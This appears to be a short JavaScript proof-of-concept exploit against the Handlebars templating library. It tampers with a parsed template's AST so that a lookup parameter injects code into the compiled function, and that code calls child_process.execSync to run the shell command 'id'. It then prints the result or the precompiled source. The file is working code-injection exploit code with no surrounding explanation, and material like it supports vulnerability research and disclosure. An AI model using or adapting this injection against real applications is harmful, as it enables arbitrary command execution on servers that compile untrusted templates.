const Handlebars = require('handlebars');

const ast = Handlebars.parse('{{lookup this 1}}');
ast.body[0].params[1].value =
  "1,{}) + global.process.mainModule.require('child_process').execSync('id').toString()) //";

try {
  const template = Handlebars.compile(ast);
  const result = template({});
  console.log("OUTPUT:", result);
} catch (e) {
  console.log("ERROR:", e.message);
  console.log(Handlebars.precompile(ast));
}
